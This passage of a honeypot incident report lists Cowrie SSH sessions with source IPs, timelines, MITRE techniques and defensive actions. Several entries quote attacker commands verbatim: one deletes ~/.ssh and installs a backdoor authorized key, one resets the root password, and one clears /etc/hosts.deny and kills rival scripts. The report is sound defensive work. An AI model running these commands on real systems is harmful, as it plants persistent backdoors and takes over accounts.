| Time (UTC) | Event |
|---|---|
| `2026-03-19 03:47:07` | `cowrie.session.connect` |
| `2026-03-19 03:47:07` | `cowrie.client.version` |
| `2026-03-19 03:47:07` | `cowrie.client.kex` |
| `2026-03-19 03:47:08` | `cowrie.login.success` |
| `2026-03-19 03:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed9eb90a8dc

| Field | Detail |
|---|---|
| **Source IP** | `118.45.101[.]159` |
| **First Seen** | 2026-03-19 04:22 |
| **Last Seen** | 2026-03-19 04:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 04:22:14` | `cowrie.session.connect` |
| `2026-03-19 04:22:15` | `cowrie.client.version` |
| `2026-03-19 04:22:15` | `cowrie.client.kex` |
| `2026-03-19 04:22:18` | `cowrie.login.success` |
| `2026-03-19 04:22:18` | `cowrie.direct-tcpip.request` |
| `2026-03-19 04:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.101[.]159` to AbuseIPDB if not already reported
- [ ] Block `118.45.101[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488c9ff1cef3

| Field | Detail |
|---|---|
| **Source IP** | `106.201.230[.]195` |
| **First Seen** | 2026-03-19 04:22 |
| **Last Seen** | 2026-03-19 04:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 04:22:24` | `cowrie.session.connect` |
| `2026-03-19 04:22:25` | `cowrie.client.version` |
| `2026-03-19 04:22:25` | `cowrie.client.kex` |
| `2026-03-19 04:22:25` | `cowrie.login.success` |
| `2026-03-19 04:22:26` | `cowrie.direct-tcpip.request` |
| `2026-03-19 04:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.201.230[.]195` to AbuseIPDB if not already reported
- [ ] Block `106.201.230[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83be43f644d6

| Field | Detail |
|---|---|
| **Source IP** | `61.240.156[.]16` |
| **First Seen** | 2026-03-19 05:48 |
| **Last Seen** | 2026-03-19 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:48:08` | `cowrie.session.connect` |
| `2026-03-19 05:48:08` | `cowrie.client.version` |
| `2026-03-19 05:48:09` | `cowrie.client.kex` |
| `2026-03-19 05:48:09` | `cowrie.login.success` |
| `2026-03-19 05:48:09` | `cowrie.session.params` |
| `2026-03-19 05:48:09` | `cowrie.command.input` |
| `2026-03-19 05:48:09` | `cowrie.command.failed` |
| `2026-03-19 05:48:10` | `cowrie.log.closed` |
| `2026-03-19 05:48:10` | `cowrie.session.params` |
| `2026-03-19 05:48:10` | `cowrie.command.input` |
| `2026-03-19 05:48:10` | `cowrie.session.file_download` |
| `2026-03-19 05:48:10` | `cowrie.log.closed` |
| `2026-03-19 05:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.156[.]16` to AbuseIPDB if not already reported
- [ ] Block `61.240.156[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d4b1b37afd

| Field | Detail |
|---|---|
| **Source IP** | `113.219.244[.]16` |
| **First Seen** | 2026-03-19 05:48 |
| **Last Seen** | 2026-03-19 05:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:48:10` | `cowrie.session.connect` |
| `2026-03-19 05:48:10` | `cowrie.client.version` |
| `2026-03-19 05:48:10` | `cowrie.client.kex` |
| `2026-03-19 05:48:11` | `cowrie.login.success` |
| `2026-03-19 05:48:12` | `cowrie.session.params` |
| `2026-03-19 05:48:12` | `cowrie.command.input` |
| `2026-03-19 05:48:12` | `cowrie.command.failed` |
| `2026-03-19 05:48:12` | `cowrie.log.closed` |
| `2026-03-19 05:48:12` | `cowrie.session.params` |
| `2026-03-19 05:48:12` | `cowrie.command.input` |
| `2026-03-19 05:48:12` | `cowrie.session.file_download` |
| `2026-03-19 05:48:12` | `cowrie.log.closed` |
| `2026-03-19 05:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.244[.]16` to AbuseIPDB if not already reported
- [ ] Block `113.219.244[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b3baaca88d

| Field | Detail |
|---|---|
| **Source IP** | `61.240.156[.]16` |
| **First Seen** | 2026-03-19 05:48 |
| **Last Seen** | 2026-03-19 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:48:12` | `cowrie.session.connect` |
| `2026-03-19 05:48:12` | `cowrie.client.version` |
| `2026-03-19 05:48:12` | `cowrie.client.kex` |
| `2026-03-19 05:48:13` | `cowrie.login.success` |
| `2026-03-19 05:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.156[.]16` to AbuseIPDB if not already reported
- [ ] Block `61.240.156[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5146d8ab50cb

| Field | Detail |
|---|---|
| **Source IP** | `113.219.244[.]16` |
| **First Seen** | 2026-03-19 05:48 |
| **Last Seen** | 2026-03-19 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:48:15` | `cowrie.session.connect` |
| `2026-03-19 05:48:15` | `cowrie.client.version` |
| `2026-03-19 05:48:15` | `cowrie.client.kex` |
| `2026-03-19 05:48:15` | `cowrie.login.success` |
| `2026-03-19 05:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.244[.]16` to AbuseIPDB if not already reported
- [ ] Block `113.219.244[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0080c53972

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-19 05:53 |
| **Last Seen** | 2026-03-19 05:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:53:28` | `cowrie.session.connect` |
| `2026-03-19 05:53:28` | `cowrie.client.version` |
| `2026-03-19 05:53:28` | `cowrie.client.kex` |
| `2026-03-19 05:53:29` | `cowrie.login.success` |
| `2026-03-19 05:53:29` | `cowrie.session.params` |
| `2026-03-19 05:53:29` | `cowrie.command.input` |
| `2026-03-19 05:53:29` | `cowrie.command.failed` |
| `2026-03-19 05:53:29` | `cowrie.log.closed` |
| `2026-03-19 05:53:30` | `cowrie.session.params` |
| `2026-03-19 05:53:30` | `cowrie.command.input` |
| `2026-03-19 05:53:30` | `cowrie.session.file_download` |
| `2026-03-19 05:53:30` | `cowrie.log.closed` |
| `2026-03-19 05:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dcb6a3e33bc

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-19 05:53 |
| **Last Seen** | 2026-03-19 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:53:32` | `cowrie.session.connect` |
| `2026-03-19 05:53:32` | `cowrie.client.version` |
| `2026-03-19 05:53:32` | `cowrie.client.kex` |
| `2026-03-19 05:53:33` | `cowrie.login.success` |
| `2026-03-19 05:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e618a5455f

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-03-19 05:58 |
| **Last Seen** | 2026-03-19 05:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 05:58:03` | `cowrie.session.connect` |
| `2026-03-19 05:58:04` | `cowrie.client.version` |
| `2026-03-19 05:58:04` | `cowrie.client.kex` |
| `2026-03-19 05:58:07` | `cowrie.login.success` |
| `2026-03-19 05:58:08` | `cowrie.direct-tcpip.request` |
| `2026-03-19 05:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d939ba4994

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-19 06:12 |
| **Last Seen** | 2026-03-19 06:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 06:12:32` | `cowrie.session.connect` |
| `2026-03-19 06:12:32` | `cowrie.client.version` |
| `2026-03-19 06:12:32` | `cowrie.client.kex` |
| `2026-03-19 06:12:33` | `cowrie.login.success` |
| `2026-03-19 06:12:34` | `cowrie.session.params` |
| `2026-03-19 06:12:34` | `cowrie.command.input` |
| `2026-03-19 06:12:34` | `cowrie.command.failed` |
| `2026-03-19 06:12:34` | `cowrie.log.closed` |
| `2026-03-19 06:12:34` | `cowrie.session.params` |
| `2026-03-19 06:12:34` | `cowrie.command.input` |
| `2026-03-19 06:12:34` | `cowrie.session.file_download` |
| `2026-03-19 06:12:34` | `cowrie.log.closed` |
| `2026-03-19 06:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d27489adf7

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-19 06:12 |
| **Last Seen** | 2026-03-19 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 06:12:37` | `cowrie.session.connect` |
| `2026-03-19 06:12:37` | `cowrie.client.version` |
| `2026-03-19 06:12:37` | `cowrie.client.kex` |
| `2026-03-19 06:12:38` | `cowrie.login.success` |
| `2026-03-19 06:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d460db523249

| Field | Detail |
|---|---|
| **Source IP** | `112.163.119[.]199` |
| **First Seen** | 2026-03-19 07:25 |
| **Last Seen** | 2026-03-19 07:28 |
| **Session Duration** | 147s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 07:25:58` | `cowrie.session.connect` |
| `2026-03-19 07:25:58` | `cowrie.client.version` |
| `2026-03-19 07:25:58` | `cowrie.client.kex` |
| `2026-03-19 07:26:00` | `cowrie.login.failed` |
| `2026-03-19 07:26:02` | `cowrie.login.success` |
| `2026-03-19 07:26:02` | `cowrie.session.params` |
| `2026-03-19 07:26:02` | `cowrie.command.input` |
| `2026-03-19 07:26:02` | `cowrie.command.failed` |
| `2026-03-19 07:26:02` | `cowrie.log.closed` |
| `2026-03-19 07:26:02` | `cowrie.session.params` |
| `2026-03-19 07:26:02` | `cowrie.command.input` |
| `2026-03-19 07:26:03` | `cowrie.log.closed` |
| `2026-03-19 07:26:03` | `cowrie.session.params` |
| `2026-03-19 07:26:03` | `cowrie.command.input` |
| `2026-03-19 07:26:03` | `cowrie.log.closed` |
| `2026-03-19 07:26:03` | `cowrie.session.params` |
| `2026-03-19 07:26:03` | `cowrie.command.input` |
| `2026-03-19 07:26:04` | `cowrie.log.closed` |
| `2026-03-19 07:26:04` | `cowrie.session.params` |
| `2026-03-19 07:26:04` | `cowrie.command.input` |
| `2026-03-19 07:26:04` | `cowrie.log.closed` |
| `2026-03-19 07:26:04` | `cowrie.session.params` |
| `2026-03-19 07:26:04` | `cowrie.command.input` |
| `2026-03-19 07:26:05` | `cowrie.log.closed` |
| `2026-03-19 07:26:05` | `cowrie.session.params` |
| `2026-03-19 07:26:05` | `cowrie.command.input` |
| `2026-03-19 07:26:05` | `cowrie.log.closed` |
| `2026-03-19 07:26:05` | `cowrie.session.params` |
| `2026-03-19 07:26:05` | `cowrie.command.input` |
| `2026-03-19 07:26:06` | `cowrie.log.closed` |
| `2026-03-19 07:26:06` | `cowrie.session.params` |
| `2026-03-19 07:26:06` | `cowrie.command.input` |
| `2026-03-19 07:26:06` | `cowrie.log.closed` |
| `2026-03-19 07:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.163.119[.]199` to AbuseIPDB if not already reported
- [ ] Block `112.163.119[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca6d40ea9b7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.41[.]98` |
| **First Seen** | 2026-03-19 08:05 |
| **Last Seen** | 2026-03-19 08:05 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dFKjnar8asGM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 08:05:06` | `cowrie.session.connect` |
| `2026-03-19 08:05:07` | `cowrie.client.version` |
| `2026-03-19 08:05:07` | `cowrie.client.kex` |
| `2026-03-19 08:05:08` | `cowrie.login.success` |
| `2026-03-19 08:05:09` | `cowrie.session.params` |
| `2026-03-19 08:05:09` | `cowrie.command.input` |
| `2026-03-19 08:05:09` | `cowrie.command.failed` |
| `2026-03-19 08:05:09` | `cowrie.log.closed` |
| `2026-03-19 08:05:10` | `cowrie.session.params` |
| `2026-03-19 08:05:10` | `cowrie.command.input` |
| `2026-03-19 08:05:10` | `cowrie.session.file_download` |
| `2026-03-19 08:05:10` | `cowrie.log.closed` |
| `2026-03-19 08:05:22` | `cowrie.session.params` |
| `2026-03-19 08:05:22` | `cowrie.command.input` |
| `2026-03-19 08:05:22` | `cowrie.log.closed` |
| `2026-03-19 08:05:23` | `cowrie.session.params` |
| `2026-03-19 08:05:23` | `cowrie.command.input` |
| `2026-03-19 08:05:23` | `cowrie.log.closed` |
| `2026-03-19 08:05:24` | `cowrie.session.params` |
| `2026-03-19 08:05:24` | `cowrie.command.input` |
| `2026-03-19 08:05:24` | `cowrie.session.file_download` |
| `2026-03-19 08:05:24` | `cowrie.log.closed` |
| `2026-03-19 08:05:24` | `cowrie.session.params` |
| `2026-03-19 08:05:24` | `cowrie.command.input` |
| `2026-03-19 08:05:25` | `cowrie.log.closed` |
| `2026-03-19 08:05:25` | `cowrie.session.params` |
| `2026-03-19 08:05:25` | `cowrie.command.input` |
| `2026-03-19 08:05:26` | `cowrie.log.closed` |
| `2026-03-19 08:05:26` | `cowrie.session.params` |
| `2026-03-19 08:05:26` | `cowrie.command.input` |
| `2026-03-19 08:05:26` | `cowrie.command.input` |
| `2026-03-19 08:05:26` | `cowrie.log.closed` |
| `2026-03-19 08:05:27` | `cowrie.session.params` |
| `2026-03-19 08:05:27` | `cowrie.command.input` |
| `2026-03-19 08:05:27` | `cowrie.log.closed` |
| `2026-03-19 08:05:27` | `cowrie.session.params` |
| `2026-03-19 08:05:27` | `cowrie.command.input` |
| `2026-03-19 08:05:27` | `cowrie.log.closed` |
| `2026-03-19 08:05:27` | `cowrie.session.params` |
| `2026-03-19 08:05:27` | `cowrie.command.input` |
| `2026-03-19 08:05:28` | `cowrie.log.closed` |
| `2026-03-19 08:05:28` | `cowrie.session.params` |
| `2026-03-19 08:05:28` | `cowrie.command.input` |
| `2026-03-19 08:05:28` | `cowrie.log.closed` |
| `2026-03-19 08:05:28` | `cowrie.session.params` |
| `2026-03-19 08:05:28` | `cowrie.command.input` |
| `2026-03-19 08:05:29` | `cowrie.log.closed` |
| `2026-03-19 08:05:29` | `cowrie.session.params` |
| `2026-03-19 08:05:29` | `cowrie.command.input` |
| `2026-03-19 08:05:29` | `cowrie.log.closed` |
| `2026-03-19 08:05:29` | `cowrie.session.params` |
| `2026-03-19 08:05:29` | `cowrie.command.input` |
| `2026-03-19 08:05:29` | `cowrie.log.closed` |
| `2026-03-19 08:05:30` | `cowrie.session.params` |
| `2026-03-19 08:05:30` | `cowrie.command.input` |
| `2026-03-19 08:05:30` | `cowrie.log.closed` |
| `2026-03-19 08:05:31` | `cowrie.session.params` |
| `2026-03-19 08:05:31` | `cowrie.command.input` |
| `2026-03-19 08:05:31` | `cowrie.log.closed` |
| `2026-03-19 08:05:32` | `cowrie.session.params` |
| `2026-03-19 08:05:32` | `cowrie.command.input` |
| `2026-03-19 08:05:32` | `cowrie.log.closed` |
| `2026-03-19 08:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.41[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.41[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b2c4f52f02a

| Field | Detail |
|---|---|
| **Source IP** | `112.86.146[.]178` |
| **First Seen** | 2026-03-19 08:57 |
| **Last Seen** | 2026-03-19 08:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 08:57:50` | `cowrie.session.connect` |
| `2026-03-19 08:57:51` | `cowrie.client.version` |
| `2026-03-19 08:57:51` | `cowrie.client.kex` |
| `2026-03-19 08:57:54` | `cowrie.login.success` |
| `2026-03-19 08:57:54` | `cowrie.direct-tcpip.request` |
| `2026-03-19 08:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.86.146[.]178` to AbuseIPDB if not already reported
- [ ] Block `112.86.146[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f9b9a23ff5

| Field | Detail |
|---|---|
| **Source IP** | `161.35.87[.]209` |
| **First Seen** | 2026-03-19 09:13 |
| **Last Seen** | 2026-03-19 09:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 09:13:14` | `cowrie.session.connect` |
| `2026-03-19 09:13:14` | `cowrie.client.version` |
| `2026-03-19 09:13:14` | `cowrie.client.kex` |
| `2026-03-19 09:13:15` | `cowrie.login.success` |
